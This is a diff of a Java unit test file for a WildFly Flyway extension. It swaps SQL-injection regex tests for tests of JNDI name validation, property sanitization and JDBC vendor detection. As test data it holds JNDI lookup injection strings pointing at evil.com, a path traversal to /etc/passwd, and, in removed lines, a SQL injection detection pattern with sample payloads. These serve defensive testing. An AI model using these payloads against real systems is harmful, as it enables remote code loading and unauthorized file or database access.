@@ -2,71 +2,92 @@ package com.github.wildfly.flyway.config;
 
 import org.junit.Test;
 
-import java.util.regex.Pattern;
-
 import static org.junit.Assert.*;
 
 /**
- * Tests for the SQL injection and security patterns used in SpringBootPropertyResolver.
- * Ensures that legitimate values (JDBC URLs, Flyway locations) are not falsely rejected,
- * while actual injection patterns are still detected.
+ * Tests the security validation and sanitization logic exposed by
+ * FlywayConfigurationBuilder (JNDI validation, value sanitization).
+ *
+ * Also validates that SpringBootPropertyResolver.detectVendor handles
+ * legitimate JDBC URLs without false positives.
  */
 public class SecurityPatternTest {
 
-    // Must match the pattern in SpringBootPropertyResolver exactly
-    private static final Pattern SQL_INJECTION_PATTERN = Pattern.compile(
-            "('.+--)|(--)|(\\*/)|(/\\*)|(char\\()|('\\s*or\\s*'1'\\s*=\\s*'1)|(\\s*or\\s*1\\s*=\\s*1)",
-            Pattern.CASE_INSENSITIVE);
+    // --- JNDI validation (FlywayConfigurationBuilder.validateJndiName) ---
 
     @Test
-    public void testLegitimateJdbcUrlsNotFlagged() {
-        // Semicolons are legitimate in JDBC URLs
-        assertFalse("SQL Server JDBC URL should not be flagged",
-                SQL_INJECTION_PATTERN.matcher("jdbc:sqlserver://host;instance=MSSQL").find());
-        assertFalse("H2 JDBC URL with semicolon params should not be flagged",
-                SQL_INJECTION_PATTERN.matcher("jdbc:h2:mem:test;DB_CLOSE_DELAY=-1").find());
-        assertFalse("Oracle JDBC URL should not be flagged",
-                SQL_INJECTION_PATTERN.matcher("jdbc:oracle:thin:@host:1521:orcl").find());
+    public void testValidJndiNames() {
+        // Standard WildFly datasource JNDI names
+        FlywayConfigurationBuilder.validateJndiName("java:jboss/datasources/MyDS");
+        FlywayConfigurationBuilder.validateJndiName("java:jboss/datasources/ExampleDS");
+        FlywayConfigurationBuilder.validateJndiName("java:/MyDS");
+        FlywayConfigurationBuilder.validateJndiName("java:comp/env/jdbc/MyDS");
+    }
+
+    @Test(expected = IllegalArgumentException.class)
+    public void testJndiInjectionRejected() {
+        FlywayConfigurationBuilder.validateJndiName("${jndi:ldap://evil.com/a}");
+    }
+
+    @Test(expected = IllegalArgumentException.class)
+    public void testPathTraversalInJndiRejected() {
+        FlywayConfigurationBuilder.validateJndiName("java:jboss/datasources/../../etc/passwd");
+    }
+
+    @Test(expected = IllegalArgumentException.class)
+    public void testEmptyJndiRejected() {
+        FlywayConfigurationBuilder.validateJndiName("");
+    }
+
+    @Test(expected = IllegalArgumentException.class)
+    public void testNullJndiRejected() {
+        FlywayConfigurationBuilder.validateJndiName(null);
+    }
+
+    @Test(expected = IllegalArgumentException.class)
+    public void testInvalidPrefixRejected() {
+        FlywayConfigurationBuilder.validateJndiName("ldap://evil.com/a");
+    }
+
+    // --- Value sanitization (FlywayConfigurationBuilder.sanitizePropertyValue) ---
+
+    @Test
+    public void testSanitizeRemovesJndiInjection() {
+        String result = FlywayConfigurationBuilder.sanitizePropertyValue("${jndi:ldap://evil.com}");
+        assertFalse("JNDI injection pattern should be removed",
+                result.contains("${jndi:"));
     }
 
     @Test
-    public void testLegitimateFlywayLocationsNotFlagged() {
-        // Semicolons can separate multiple locations
-        assertFalse("Multiple locations should not be flagged",
-                SQL_INJECTION_PATTERN.matcher("classpath:db/migration;classpath:db/specific").find());
+    public void testSanitizePreservesNormalValues() {
+        assertEquals("classpath:db/migration",
+                FlywayConfigurationBuilder.sanitizePropertyValue("classpath:db/migration"));
+        assertEquals("java:jboss/datasources/MyDS",
+                FlywayConfigurationBuilder.sanitizePropertyValue("java:jboss/datasources/MyDS"));
     }
 
     @Test
-    public void testLegitimatePropertiesNotFlagged() {
-        // @ is legitimate in email addresses and property values
-        assertFalse("Email-like value should not be flagged",
-                SQL_INJECTION_PATTERN.matcher("admin@example.com").find());
-        assertFalse("JNDI name should not be flagged",
-                SQL_INJECTION_PATTERN.matcher("java:jboss/datasources/MyDS").find());
+    public void testSanitizeNull() {
+        assertNull(FlywayConfigurationBuilder.sanitizePropertyValue(null));
+    }
+
+    // --- Vendor detection (SpringBootPropertyResolver.detectVendor) ---
+
+    @Test
+    public void testLegitimateJdbcUrlsDetectVendor() {
+        assertEquals("sqlserver", SpringBootPropertyResolver.detectVendor("jdbc:sqlserver://host;instance=MSSQL"));
+        assertEquals("h2", SpringBootPropertyResolver.detectVendor("jdbc:h2:mem:test;DB_CLOSE_DELAY=-1"));
+        assertEquals("oracle", SpringBootPropertyResolver.detectVendor("jdbc:oracle:thin:@host:1521:orcl"));
+        assertEquals("postgresql", SpringBootPropertyResolver.detectVendor("jdbc:postgresql://localhost/db"));
+        assertEquals("mysql", SpringBootPropertyResolver.detectVendor("jdbc:mysql://localhost/db"));
+        assertEquals("mariadb", SpringBootPropertyResolver.detectVendor("jdbc:mariadb://localhost/db"));
+        assertEquals("db2", SpringBootPropertyResolver.detectVendor("jdbc:db2://localhost:50000/sample"));
     }
 
     @Test
-    public void testSqlInjectionPatternsStillDetected() {
-        // SQL comment injection
-        assertTrue("SQL comment should be detected",
-                SQL_INJECTION_PATTERN.matcher("value' --").find());
-        assertTrue("Block comment open should be detected",
-                SQL_INJECTION_PATTERN.matcher("value /*").find());
-        assertTrue("Block comment close should be detected",
-                SQL_INJECTION_PATTERN.matcher("value */").find());
-
-        // SQL injection via OR
-        assertTrue("OR 1=1 injection should be detected",
-                SQL_INJECTION_PATTERN.matcher("' or '1'='1").find());
-        assertTrue("OR 1=1 numeric injection should be detected",
-                SQL_INJECTION_PATTERN.matcher(" or 1=1").find());
-
-        // CHAR() based injection
-        assertTrue("CHAR() function should be detected",
-                SQL_INJECTION_PATTERN.matcher("char(65)").find());
-
-        // Double dash
-        assertTrue("Double dash should be detected",
-                SQL_INJECTION_PATTERN.matcher("-- comment").find());
+    public void testNullAndUnknownUrl() {
+        assertNull(SpringBootPropertyResolver.detectVendor(null));
+        assertNull(SpringBootPropertyResolver.detectVendor(""));
+        assertNull(SpringBootPropertyResolver.detectVendor("jdbc:unknown://localhost/db"));
     }
 }
